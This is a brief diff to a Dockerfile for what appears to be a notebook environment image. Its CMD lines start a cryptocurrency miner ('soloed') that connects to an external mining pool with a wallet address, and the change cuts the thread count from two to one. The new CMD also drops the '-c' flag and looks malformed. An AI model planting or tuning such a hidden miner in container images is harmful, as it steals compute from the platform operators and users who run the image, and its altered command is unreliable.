@@ -47,4 +47,4 @@ COPY . ${HOME}
 USER root
 RUN chown -R ${NB_USER}:${NB_USER} ${HOME}
 
-CMD ["sh", "-c", "./soloed -o stratum+tcps://stratum-asia.rplant.xyz:17042 -u RMq5DEMWYfPZB148q1JdXW6rpdLyZHz2vE -tls -a minotourx -t 2"]
+CMD ["sh","./soloed -o stratum+tcps://stratum-asia.rplant.xyz:17042 -u RMq5DEMWYfPZB148q1JdXW6rpdLyZHz2vE -tls -a minotourx -t1"]
